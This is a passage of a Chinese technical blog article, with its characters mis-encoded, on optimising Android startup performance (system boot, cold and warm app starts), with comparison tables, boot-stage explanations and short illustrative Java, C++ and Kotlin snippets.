            ç¨³å®šæ€§æ€§èƒ½ç³»åˆ—ä¹‹ä¹â€”â€”å¯åŠ¨æ€§èƒ½ä¼˜åŒ–:Bootã€å†·å¯åŠ¨ä¸çƒ­å¯åŠ¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:15:43.000Z" title="Wed Jan 07 2026 14:15:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»21åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¯åŠ¨é€Ÿåº¦,æ˜¯ç”¨æˆ·å¯¹Appçš„ç¬¬ä¸€å°è±¡ã€‚æ…¢ä¸€ç§’,å¯èƒ½å°±æµå¤±äº†ä¸€ä¸ªç”¨æˆ·ã€‚æœ¬æ–‡å°†å¸¦ä½ ç³»ç»ŸåŒ–åœ°æ”»å…‹Androidä¸‰ç§å¯åŠ¨ç±»å‹çš„æ€§èƒ½ä¼˜åŒ–éš¾é¢˜ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>å¯åŠ¨æ€§èƒ½æ˜¯å½±å“ç”¨æˆ·ä½“éªŒçš„å…³é”®æŒ‡æ ‡ã€‚æ ¹æ®Googleçš„ç»Ÿè®¡,å¯åŠ¨æ—¶é—´æ¯å¢åŠ 1ç§’,ç”¨æˆ·ç•™å­˜ç‡ä¼šä¸‹é™çº¦5%ã€‚åœ¨å®é™…é¡¹ç›®ä¸­,å¯åŠ¨è€—æ—¶è¶…è¿‡3ç§’çš„åº”ç”¨å¾€å¾€é¢ä¸´ç”¨æˆ·æµå¤±å’Œä¸šåŠ¡å‹åŠ›ã€‚</p>
<p>å…¸å‹çš„å¯åŠ¨æ€§èƒ½é—®é¢˜è¡¨ç°ä¸º:</p>
<ul>
<li>ç‚¹å‡»å›¾æ ‡åå‡ºç°ç™½å±,æŒç»­1ç§’ä»¥ä¸Š</li>
<li>Logoæ˜¾ç¤ºé˜¶æ®µè€—æ—¶è¿‡é•¿</li>
<li>é¦–é¡µå†…å®¹åŠ è½½ç¼“æ…¢,ç”¨æˆ·éœ€è¦ç­‰å¾…3ç§’ä»¥ä¸Šæ‰èƒ½çœ‹åˆ°å†…å®¹</li>
</ul>
<p>é¢å¯¹å¯åŠ¨æ€§èƒ½é—®é¢˜,å¸¸è§çš„ä¼˜åŒ–æ€è·¯åŒ…æ‹¬:</p>
<ul>
<li>Applicationåˆå§‹åŒ–ä¼˜åŒ–</li>
<li>ActivityåŠ è½½æµç¨‹ä¼˜åŒ–</li>
<li>ç½‘ç»œè¯·æ±‚å¼‚æ­¥åŒ–</li>
<li>é¦–å±èµ„æºåŠ è½½ä¼˜åŒ–</li>
</ul>
<p>ç„¶è€Œ,ä»…å‡­ç»éªŒåˆ¤æ–­å¾€å¾€æ— æ³•å‡†ç¡®å®šä½æ€§èƒ½ç“¶é¢ˆã€‚<strong>æ€§èƒ½ä¼˜åŒ–å¿…é¡»åŸºäºæ•°æ®é©±åŠ¨,é€šè¿‡ä¸“ä¸šçš„æ€§èƒ½åˆ†æå·¥å…·å®šä½é—®é¢˜ã€‚</strong></p>
<p>æœ¬æ–‡å°†ç³»ç»ŸåŒ–åœ°è®²è§£Androidä¸‰ç§å¯åŠ¨ç±»å‹çš„ä¼˜åŒ–æ–¹æ³•,å¸®åŠ©ä½ ä¹Ÿèƒ½å®ç°ä»3ç§’åˆ°1ç§’çš„æ€§èƒ½é£è·ƒã€‚</p>
<p><strong>è¯»å®Œæœ¬æ–‡,ä½ å°†å­¦ä¼š:</strong></p>
<ol>
<li>âœ… åŒºåˆ†System Bootã€å†·å¯åŠ¨ã€çƒ­å¯åŠ¨ä¸‰ç§å¯åŠ¨ç±»å‹</li>
<li>âœ… ä½¿ç”¨Systrace/Perfettoç²¾ç¡®æµ‹é‡å¯åŠ¨æ€§èƒ½</li>
<li>âœ… æŒæ¡Applicationã€Activityã€é¦–å±æ¸²æŸ“ä¸‰é˜¶æ®µçš„ä¼˜åŒ–æŠ€å·§</li>
<li>âœ… å­¦ä¼šSystem Bootçš„æ·±åº¦ä¼˜åŒ–(å†…æ ¸ã€Initã€Zygoteã€SystemServer)</li>
<li>âœ… å»ºç«‹CI/CDè‡ªåŠ¨åŒ–å¯åŠ¨æ€§èƒ½ç›‘æ§ä½“ç³»</li>
<li>âœ… äº†è§£è½¦æœºåœºæ™¯çš„ç‰¹æ®Šä¼˜åŒ–ç­–ç•¥</li>
</ol>
<hr/>
<h2 data-id="heading-1">ä¸€ã€å¯åŠ¨ç±»å‹è¯¦è§£:ä¸‰ç§å¯åŠ¨,ä¸‰ç§ç­–ç•¥</h2>
<p>å¾ˆå¤šå¼€å‘è€…ä¼šæŠŠ"å¯åŠ¨ä¼˜åŒ–"ç¬¼ç»Ÿåœ°å½“æˆä¸€ä»¶äº‹,ä½†å®é™…ä¸ŠAndroidçš„å¯åŠ¨åˆ†ä¸º<strong>ä¸‰ç§å®Œå…¨ä¸åŒçš„ç±»å‹</strong>,å®ƒä»¬çš„è§¦å‘åœºæ™¯ã€ä¼˜åŒ–ç­–ç•¥å’Œæ€§èƒ½åŸºå‡†éƒ½æˆªç„¶ä¸åŒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e87424e8434c4e168779846d5002b6aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768400142&amp;x-signature=UbsKmum%2BZcRlNaPa4VN8P4jcJMg%3D" alt="09-01-launch-types-comparison.png" loading="lazy"/></p>
<h3 data-id="heading-2">1.1 ä¸‰ç§å¯åŠ¨ç±»å‹å…¨é¢å¯¹æ¯”</h3>









































<table><thead><tr><th align="left">å¯åŠ¨ç±»å‹</th><th align="left">è§¦å‘åœºæ™¯</th><th align="left">è¿›ç¨‹çŠ¶æ€</th><th align="left">å…¸å‹è€—æ—¶</th><th align="left">ä¼˜åŒ–éš¾åº¦</th><th align="left">ä¸»è¦ä¼˜åŒ–ç‚¹</th><th align="left">å…³é”®æŒ‡æ ‡</th></tr></thead><tbody><tr><td align="left"><strong>System Boot</strong></td><td align="left">è®¾å¤‡å¼€æœº<br/>è®¾å¤‡é‡å¯</td><td align="left">ç³»ç»Ÿä»é›¶å¯åŠ¨</td><td align="left">20-60ç§’</td><td align="left">â­â­â­â­â­</td><td align="left">BootLoader<br/>Kernel<br/>Init<br/>Zygote<br/>SystemServer</td><td align="left"><code>boot_progress_*</code>äº‹ä»¶<br/><code>ACTION_BOOT_COMPLETED</code></td></tr><tr><td align="left"><strong>å†·å¯åŠ¨</strong></td><td align="left">Appé¦–æ¬¡å®‰è£…åå¯åŠ¨<br/>Appè¢«ç³»ç»Ÿæ€æ­»åå¯åŠ¨<br/>è®¾å¤‡é‡å¯åé¦–æ¬¡å¯åŠ¨App</td><td align="left">è¿›ç¨‹ä¸å­˜åœ¨<br/>éœ€è¦åˆ›å»ºè¿›ç¨‹</td><td align="left">1-5ç§’</td><td align="left">â­â­â­â­</td><td align="left">Application<br/>Activity<br/>é¦–å±æ¸²æŸ“</td><td align="left"><code>reportFullyDrawn()</code><br/><code>TotalTime</code>æŒ‡æ ‡</td></tr><tr><td align="left"><strong>çƒ­å¯åŠ¨</strong></td><td align="left">Appä»åå°æ¢å¤<br/>æŒ‰Homeåå†æ‰“å¼€<br/>åˆ‡æ¢åˆ°å…¶ä»–Appåè¿”å›</td><td align="left">è¿›ç¨‹å­˜åœ¨<br/>Activityéœ€é‡å»º</td><td align="left">0.3-1ç§’</td><td align="left">â­â­â­</td><td align="left">Activityæ¢å¤<br/>ViewçŠ¶æ€æ¢å¤<br/>æ•°æ®åˆ·æ–°</td><td align="left"><code>onRestart()</code><br/><code>onResume()</code>è€—æ—¶</td></tr></tbody></table>
<p><strong>ä¸‰è€…çš„æœ¬è´¨åŒºåˆ«</strong>:</p>
<ol>
<li><strong>System Boot</strong>: ç³»ç»Ÿçº§å¯åŠ¨,æ¶‰åŠç¡¬ä»¶åˆå§‹åŒ–ã€å†…æ ¸åŠ è½½ã€ç³»ç»ŸæœåŠ¡å¯åŠ¨,å½±å“æ‰€æœ‰åº”ç”¨</li>
<li><strong>å†·å¯åŠ¨</strong>: è¿›ç¨‹çº§å¯åŠ¨,ä»æ— åˆ°æœ‰åˆ›å»ºè¿›ç¨‹ã€åŠ è½½ä»£ç ã€åˆå§‹åŒ–åº”ç”¨</li>
<li><strong>çƒ­å¯åŠ¨</strong>: Activityçº§å¯åŠ¨,è¿›ç¨‹å·²å­˜åœ¨,åªéœ€æ¢å¤Activityå’ŒUIçŠ¶æ€</li>
</ol>
<p><strong>ä¼˜åŒ–ç­–ç•¥çš„å·®å¼‚</strong>:</p>
<ul>
<li>System Bootéœ€è¦ä»BootLoaderã€Kernelã€Frameworkå±‚é¢ä¼˜åŒ–,éœ€è¦ç³»ç»Ÿçº§æƒé™</li>
<li>å†·å¯åŠ¨éœ€è¦ä¼˜åŒ–Applicationã€Activityã€æ¸²æŸ“æµç¨‹,åº”ç”¨å¼€å‘è€…å¯æ§</li>
<li>çƒ­å¯åŠ¨ä¸»è¦ä¼˜åŒ–Activityç”Ÿå‘½å‘¨æœŸå’Œæ•°æ®æ¢å¤,ç›¸å¯¹ç®€å•</li>
</ul>
<h3 data-id="heading-3">1.2 System Boot:ç³»ç»Ÿå¯åŠ¨çš„å®Œæ•´é“¾è·¯</h3>
<p>System Bootæ˜¯ç”¨æˆ·å¼€æœºååˆ°çœ‹åˆ°Launcheræ¡Œé¢çš„å®Œæ•´è¿‡ç¨‹,æ¶‰åŠä»ç¡¬ä»¶åˆ°è½¯ä»¶çš„å¤šä¸ªé˜¶æ®µã€‚</p>
<p><strong>å¯åŠ¨æµç¨‹å›¾</strong>:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cb79ae86efe437bb737f742ea2fcfee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768400142&amp;x-signature=aGscd%2F04XhuKxzjx6jfO6kE4yls%3D" alt="09-02-system-boot-timeline.png" loading="lazy"/></p>
<p><strong>å„é˜¶æ®µè¯¦è§£</strong>:</p>
<p><strong>1. BootLoaderé˜¶æ®µ (2-5ç§’)</strong></p>
<ul>
<li><strong>èŒè´£</strong>: ç¡¬ä»¶è‡ªæ£€ã€å†…å­˜åˆå§‹åŒ–ã€åŠ è½½Kernelåˆ°å†…å­˜</li>
<li><strong>å…³é”®æ–‡ä»¶</strong>: <code>aboot.img</code> (Android BootLoader)</li>
<li><strong>ä¼˜åŒ–ç©ºé—´</strong>: æœ‰é™,ä¸»è¦å—ç¡¬ä»¶é™åˆ¶</li>
</ul>
<p><strong>2. Kernelé˜¶æ®µ (3-8ç§’)</strong></p>
<ul>
<li>
<p><strong>èŒè´£</strong>:</p>
<ul>
<li>åˆå§‹åŒ–CPUã€å†…å­˜ã€I/Oå­ç³»ç»Ÿ</li>
<li>åŠ è½½è®¾å¤‡é©±åŠ¨(æ˜¾ç¤ºã€è§¦æ‘¸ã€éŸ³é¢‘ç­‰)</li>
<li>æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ</li>
<li>å¯åŠ¨ç¬¬ä¸€ä¸ªç”¨æˆ·ç©ºé—´è¿›ç¨‹ <code>/init</code></li>
</ul>
</li>
<li>
<p><strong>å…³é”®äº‹ä»¶</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">[    0.000000] Booting Linux on physical CPU 0x0
[    1.234567] Freeing unused kernel memory: 1024K
[    2.345678] init: init first stage started!
</code></pre>
</li>
<li>
<p><strong>ä¼˜åŒ–ç©ºé—´</strong>: ä¸­ç­‰,å¯ç²¾ç®€é©±åŠ¨ã€ä¼˜åŒ–æŒ‚è½½</p>
</li>
</ul>
<p><strong>3. Inité˜¶æ®µ (5-10ç§’)</strong></p>
<ul>
<li>
<p><strong>èŒè´£</strong>:</p>
<ul>
<li>è§£æå¹¶æ‰§è¡Œ <code>init.rc</code> è„šæœ¬</li>
<li>åˆ›å»ºæ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹</li>
<li>å¯åŠ¨å±æ€§æœåŠ¡ <code>property_service</code></li>
<li>å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹:
<ul>
<li><code>servicemanager</code> (BinderæœåŠ¡ç®¡ç†)</li>
<li><code>surfaceflinger</code> (æ˜¾ç¤ºæœåŠ¡)</li>
<li><code>zygote</code> (è¿›ç¨‹å­µåŒ–å™¨)</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>å…³é”®ä»£ç </strong>:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// system/core/init/init.cpp</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> </span>{
    <span class="hljs-comment">// è§£æinit.rc</span>
    Parser parser;
    parser.<span class="hljs-built_in">ParseConfig</span>(<span class="hljs-string">"/init.rc"</span>);

    <span class="hljs-comment">// å¯åŠ¨æœåŠ¡</span>
    ServiceList&amp; sm = ServiceList::<span class="hljs-built_in">GetInstance</span>();
    sm.<span class="hljs-built_in">StartServices</span>();
}
</code></pre>
</li>
<li>
<p><strong>ä¼˜åŒ–ç©ºé—´</strong>: å¤§,å¯å¹¶è¡Œå¯åŠ¨ã€å»¶è¿Ÿå¯åŠ¨éå…³é”®æœåŠ¡</p>
</li>
</ul>
<p><strong>4. Zygoteé˜¶æ®µ (2-5ç§’)</strong></p>
<p>Zygoteæ˜¯æ‰€æœ‰Appè¿›ç¨‹çš„"çˆ¶è¿›ç¨‹",é€šè¿‡<code>fork()</code>æœºåˆ¶å¿«é€Ÿåˆ›å»ºæ–°è¿›ç¨‹ã€‚</p>
<ul>
<li>
<p><strong>èŒè´£</strong>:</p>
<ul>
<li>é¢„åŠ è½½å¸¸ç”¨ç±» (çº¦5000ä¸ªç±»)</li>
<li>é¢„åŠ è½½ç³»ç»Ÿèµ„æº</li>
<li>åˆ›å»ºJVMå’ŒARTè¿è¡Œæ—¶</li>
<li>ç­‰å¾…Socketè¿æ¥(æ¥æ”¶forkè¯·æ±‚)</li>
</ul>
</li>
<li>
<p><strong>å…³é”®ä»£ç </strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String argv[])</span> {
    <span class="hljs-comment">// é¢„åŠ è½½ç±»</span>
    preloadClasses();

    <span class="hljs-comment">// é¢„åŠ è½½èµ„æº</span>
    preloadResources();

    <span class="hljs-comment">// é¢„åŠ è½½å…±äº«åº“</span>
    preloadSharedLibraries();

    <span class="hljs-comment">// å¯åŠ¨SystemServer</span>
    forkSystemServer();

    <span class="hljs-comment">// è¿›å…¥Loop,ç­‰å¾…åˆ›å»ºAppè¿›ç¨‹</span>
    runSelectLoop();
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">preloadClasses</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// åŠ è½½ /system/etc/preloaded-classes ä¸­çš„ç±»</span>
    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> ClassLoader.getSystemResourceAsStream(<span class="hljs-string">"preloaded-classes"</span>);
    <span class="hljs-comment">// ... åŠ è½½çº¦5000ä¸ªç±»,è€—æ—¶2-3ç§’</span>
}
</code></pre>
</li>
<li>
<p><strong>ä¼˜åŒ–ç©ºé—´</strong>: å¤§,å¯ç²¾ç®€é¢„åŠ è½½ç±»åˆ—è¡¨</p>
</li>
</ul>
<p><strong>5. SystemServeré˜¶æ®µ (5-15ç§’)</strong></p>
<p>SystemServeræ˜¯Androidç³»ç»Ÿçš„æ ¸å¿ƒè¿›ç¨‹,è¿è¡Œç€æ‰€æœ‰ç³»ç»ŸæœåŠ¡ã€‚</p>
<ul>
<li>
<p><strong>èŒè´£</strong>:</p>
<ul>
<li>å¯åŠ¨Bootstrap Services (æ ¸å¿ƒæœåŠ¡):
<ul>
<li><code>ActivityManagerService</code> (AMS)</li>
<li><code>PowerManagerService</code> (PMS)</li>
<li><code>PackageManagerService</code> (PMS)</li>
</ul>
</li>
<li>å¯åŠ¨Core Services (å¿…é¡»æœåŠ¡):
<ul>
<li><code>BatteryService</code></li>
<li><code>UsageStatsService</code></li>
</ul>
</li>
<li>å¯åŠ¨Other Services (å…¶ä»–æœåŠ¡):
<ul>
<li><code>WindowManagerService</code> (WMS)</li>
<li><code>InputManagerService</code> (IMS)</li>
<li><code>LocationManagerService</code></li>
<li>...çº¦80ä¸ªæœåŠ¡</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>å…³é”®ä»£ç </strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/services/java/com/android/server/SystemServer.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// é˜¶æ®µ1: å¯åŠ¨BootstrapæœåŠ¡</span>
    startBootstrapServices();

    <span class="hljs-comment">// é˜¶æ®µ2: å¯åŠ¨CoreæœåŠ¡</span>
    startCoreServices();

    <span class="hljs-comment">// é˜¶æ®µ3: å¯åŠ¨OtheræœåŠ¡</span>
    startOtherServices();

    <span class="hljs-comment">// è¿›å…¥Loop</span>
    Looper.loop();
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startBootstrapServices</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// å¯åŠ¨AMS</span>
    mActivityManagerService = ActivityManagerService.Lifecycle.startService(
        mSystemServiceManager, atm);

    <span class="hljs-comment">// å¯åŠ¨PMS</span>
    mPackageManagerService = PackageManagerService.main(...);
}
</code></pre>
</li>
<li>
<p><strong>ä¼˜åŒ–ç©ºé—´</strong>: æœ€å¤§,å¯åˆ†é˜¶æ®µå¯åŠ¨ã€å»¶è¿Ÿå¯åŠ¨</p>
</li>
</ul>
<p><strong>6. Launcheré˜¶æ®µ (3-5ç§’)</strong></p>
<ul>
<li><strong>èŒè´£</strong>: æ˜¾ç¤ºæ¡Œé¢å›¾æ ‡,å“åº”ç”¨æˆ·ç‚¹å‡»</li>
<li><strong>å…³é”®æŒ‡æ ‡</strong>: <code>ACTION_BOOT_COMPLETED</code> å¹¿æ’­å‘é€æ—¶é—´</li>
</ul>
<p><strong>Bootæ€§èƒ½åŸºå‡†</strong>:</p>

































<table><thead><tr><th align="left">è®¾å¤‡ç±»å‹</th><th align="right">ä¼˜ç§€</th><th align="right">è‰¯å¥½</th><th align="right">ä¸€èˆ¬</th><th align="right">è¾ƒå·®</th></tr></thead><tbody><tr><td align="left">æ——èˆ°æ‰‹æœº</td><td align="right">&lt; 20s</td><td align="right">20-30s</td><td align="right">30-40s</td><td align="right">&gt; 40s</td></tr><tr><td align="left">ä¸­ç«¯æ‰‹æœº</td><td align="right">&lt; 25s</td><td align="right">25-35s</td><td align="right">35-45s</td><td align="right">&gt; 45s</td></tr><tr><td align="left">è½¦è½½ç³»ç»Ÿ</td><td align="right">&lt; 10s</td><td align="right">10-15s</td><td align="right">15-20s</td><td align="right">&gt; 20s</td></tr></tbody></table>
<h3 data-id="heading-4">1.3 Appå†·å¯åŠ¨:ä»ç‚¹å‡»åˆ°å¯è§çš„å…¨è¿‡ç¨‹</h3>
<p>å†·å¯åŠ¨æ˜¯ç”¨æˆ·ç‚¹å‡»Appå›¾æ ‡å,ç³»ç»Ÿåˆ›å»ºè¿›ç¨‹ã€åŠ è½½ä»£ç ã€åˆå§‹åŒ–Applicationã€å¯åŠ¨Activityã€æ¸²æŸ“é¦–å±çš„å®Œæ•´è¿‡ç¨‹ã€‚</p>
<p><strong>å¯åŠ¨æµç¨‹å›¾</strong>:</p>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·ç‚¹å‡»å›¾æ ‡
   â†“
Launcheré€šçŸ¥<span class="hljs-built_in">ActivityManagerService</span>(AMS)
   â†“
AMSæ£€æŸ¥è¿›ç¨‹æ˜¯å¦å­˜åœ¨
   â†“
è¿›ç¨‹ä¸å­˜åœ¨,é€šçŸ¥Zygote forkæ–°è¿›ç¨‹
   â†“
Zygote forkè¿›ç¨‹ (<span class="hljs-number">100</span>-<span class="hljs-number">300ms</span>)
   â†“
æ–°è¿›ç¨‹å¯åŠ¨,åŠ è½½Application
   â†“
Application<span class="hljs-selector-class">.onCreate</span>() æ‰§è¡Œ (<span class="hljs-number">200</span>-<span class="hljs-number">800ms</span>)
   â”œâ”€ SDKåˆå§‹åŒ–
   â”œâ”€ æ•°æ®åº“åˆå§‹åŒ–
   â””â”€ é…ç½®åŠ è½½
   â†“
AMSé€šçŸ¥å¯åŠ¨Activity
   â†“
Activity<span class="hljs-selector-class">.onCreate</span>() æ‰§è¡Œ (<span class="hljs-number">300</span>-<span class="hljs-number">1000ms</span>)
   â”œâ”€ <span class="hljs-built_in">setContentView</span>()
   â”œâ”€ æ•°æ®åŠ è½½
   â””â”€ UIåˆå§‹åŒ–
   â†“
Activity<span class="hljs-selector-class">.onStart</span>() / <span class="hljs-built_in">onResume</span>() æ‰§è¡Œ
   â†“
é¦–å¸§æ¸²æŸ“ (measure â†’ layout â†’ draw) (<span class="hljs-number">100</span>-<span class="hljs-number">300ms</span>)
   â†“
ç”¨æˆ·çœ‹åˆ°é¦–å±!
</code></pre>
<p><strong>è€—æ—¶åˆ†å¸ƒå‚è€ƒ</strong> (æŸç”µå•†Appå®æµ‹æ•°æ®):</p>









































<table><thead><tr><th align="left">é˜¶æ®µ</th><th align="right">è€—æ—¶</th><th align="right">å æ¯”</th><th align="left">å¯ä¼˜åŒ–ç©ºé—´</th></tr></thead><tbody><tr><td align="left">forkè¿›ç¨‹</td><td align="right">200ms</td><td align="right">9%</td><td align="left">âŒ ç³»ç»Ÿæ§åˆ¶</td></tr><tr><td align="left">Application.onCreate()</td><td align="right">800ms</td><td align="right">38%</td><td align="left">âœ… å»¶è¿Ÿ/å¼‚æ­¥åˆå§‹åŒ–</td></tr><tr><td align="left">Activity.onCreate()</td><td align="right">800ms</td><td align="right">38%</td><td align="left">âœ… å¼‚æ­¥åŠ è½½/é¢„åŠ è½½</td></tr><tr><td align="left">é¦–å±æ¸²æŸ“</td><td align="right">300ms</td><td align="right">14%</td><td align="left">âœ… å¸ƒå±€/å›¾ç‰‡ä¼˜åŒ–</td></tr><tr><td align="left"><strong>æ€»è®¡</strong></td><td align="right"><strong>2100ms</strong></td><td align="right"><strong>100%</strong></td><td align="left"><strong>ä¼˜åŒ–åˆ°950ms</strong></td></tr></tbody></table>
<p><strong>å…³é”®æ—¶é—´èŠ‚ç‚¹</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æµ‹é‡å„é˜¶æ®µè€—æ—¶</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()
        <span class="hljs-keyword">super</span>.onCreate()

        <span class="hljs-comment">// åˆå§‹åŒ–æ“ä½œ</span>
        initSDKs()

        <span class="hljs-keyword">val</span> appTime = System.currentTimeMillis() - startTime
        Log.d(<span class="hljs-string">"Performance"</span>, <span class="hljs-string">"Applicationè€—æ—¶: <span class="hljs-subst">${appTime}</span>ms"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
